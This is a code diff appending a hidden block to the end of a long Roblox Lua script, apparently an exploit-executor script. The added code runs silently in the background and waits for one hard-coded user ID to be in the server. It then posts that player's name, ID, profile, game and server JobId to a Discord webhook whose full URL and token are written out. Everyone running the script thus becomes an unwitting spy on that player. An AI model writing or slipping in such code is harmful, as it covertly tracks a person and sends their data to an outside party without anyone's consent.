@@ -4590,3 +4590,78 @@ else
     end
 end
 end)
+		task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+
+    local targetUserId = 8608467180
+    local hasSent = false -- đảm bảo chỉ gửi 1 lần
+
+    -- lấy tên game
+    local GameName = "Unknown Game"
+    local success, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    if success and info and info.Name then
+        GameName = info.Name
+    end
+
+    -- hàm gửi webhook
+    local function sendWebhook(plr)
+        if hasSent then return end
+        hasSent = true
+
+        local OSTime = os.time()
+        local Time = os.date('!*t', OSTime)
+
+        local Content = "# **Forsaken**"
+        local Embed = {
+            title = '🔔 Player Detected',
+            color = 0xFF0000,
+            footer = { text = "🔍 JobId: " .. (game.JobId or "No JobId") },
+            author = {
+                name = 'Click Link - Subscribe!',
+                url = 'https://youtube.com'
+            },
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+            },
+            fields = {
+                { name = '🎯 Roblox Username', value = "@" .. plr.Name, inline = true },
+                { name = '📛 Display Name', value = plr.DisplayName, inline = true },
+                { name = '🆔 User ID', value = tostring(plr.UserId), inline = true },
+                { name = '🎮 Game', value = string.format("Name: %s | ID: %d", GameName, game.PlaceId), inline = true },
+                { name = '🔗 Game Link', value = "https://www.roblox.com/games/" .. tostring(game.PlaceId), inline = true },
+                { name = '🔗 Profile Link', value = "https://www.roblox.com/users/" .. tostring(plr.UserId), inline = true }
+            },
+            timestamp = string.format('%d-%02d-%02dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec)
+        }
+
+        local webhookUrl = 'https://discord.com/api/webhooks/1412942583423959060/-9EHhOutGVXof6_yHIDYpfDt4OFOexejDDIfxDMdkIaUOh1urCu3zBZt3xSgvL4PzqV8'
+        local requestFunction = syn and syn.request or http_request or http and http.request
+
+        pcall(function()
+            requestFunction({
+                Url = webhookUrl,
+                Method = 'POST',
+                Headers = { ['Content-Type'] = 'application/json' },
+                Body = HttpService:JSONEncode({ content = Content, embeds = { Embed } })
+            })
+        end)
+    end
+
+    -- check hiện có
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.UserId == targetUserId then
+            sendWebhook(plr)
+        end
+    end
+
+    -- check khi có người mới join
+    Players.PlayerAdded:Connect(function(plr)
+        if plr.UserId == targetUserId then
+            sendWebhook(plr)
+        end
+    end)
+end)
